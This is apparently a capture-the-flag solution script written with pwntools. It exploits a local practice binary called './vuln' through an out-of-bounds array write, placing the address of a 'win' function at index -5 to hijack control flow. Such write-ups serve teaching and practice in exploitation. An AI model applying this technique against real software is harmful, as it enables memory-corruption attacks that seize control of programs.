#!/usr/bin/env python

from pwn import *

r = process("./vuln")

r.recvuntil("Input the integer value you want to put in the array\n")
r.sendline(str(0x80485c6)) # <win>
    
r.recvuntil("Input the index in which you want to put the value\n")
r.sendline(str(-5))
print(r.recvall())

r.close()

